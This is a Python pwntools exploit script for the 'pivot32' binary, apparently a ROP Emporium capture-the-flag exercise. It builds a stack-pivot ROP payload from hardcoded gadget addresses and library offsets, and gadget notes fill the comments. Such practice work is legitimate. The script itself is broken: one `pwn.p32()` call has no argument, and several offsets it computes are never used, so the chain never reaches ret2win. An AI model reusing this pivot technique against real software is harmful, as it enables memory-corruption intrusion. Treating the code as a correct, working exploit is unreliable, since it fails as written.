import pwn
import sys

binary = pwn.ELF("pivot32")
rop = pwn.ROP(binary)
foothold_func_got = binary.symbols[b'got.foothold_function']
# rabin2 -s ./libpivot32.so
foothold_func_offset = 0x00000770
ret2win_offset = 0x00000967
xchg_eax_esp = 0x080488c2
call_eax = 0x080486a3
pop_eax = 0x080488c0
add_8_al_call_eax = 0x080486a1

second_chain = b''
rop.call("got.foothold_function")
second_chain += rop.chain()


payload = b''
# 299
payload += ("D"*(299 - 40)).encode()
payload += second_chain
payload += ("D"*(40 - len(second_chain))).encode()
# These three instructions will attempt execution at the last 40 bytes of the buffer
payload += pwn.p32(pop_eax)
payload += pwn.p32()
payload += pwn.p32(xchg_eax_esp)
payload += pwn.p32(call_eax)

payload += "\n".encode()

with open("input.txt", "wb") as f:
    f.write(payload)

# write to esp
# 0x080488c0: pop eax; ret;
# 0x080488c2: xchg eax, esp; ret;

# 0x080488c0: pop eax; ret;
# 0x08048a5f: jmp eax;

# 0x080488c0: pop eax; ret;
# 0x080486a3: call eax;

# call to esp
# 0x080488c2: xchg eax, esp; ret;
# 0x080488c4: mov eax, dword ptr [eax]; ret;
# 0x080486a1: add al, 8; call eax;



